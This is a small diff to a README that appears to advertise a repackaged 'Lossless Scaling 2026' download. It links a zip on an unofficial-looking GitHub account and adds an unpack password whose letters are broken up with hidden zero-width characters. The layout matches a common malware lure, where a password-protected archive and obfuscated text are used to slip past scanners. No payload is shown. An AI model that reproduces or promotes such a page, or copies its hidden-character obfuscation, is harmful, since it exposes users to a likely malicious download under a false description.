@@ -16,6 +16,7 @@
 </div>
 
 # [Latest release](https://github.com/GalaxyboltNoble37142/Lossless-Scaling/releases/download/ver1/LosslessScaling.zip)
+## U​np​a‌ck pa​s​sw‌o​r​d: 2026
 ---
 
 ## 📌 About Lossless Scaling 2026
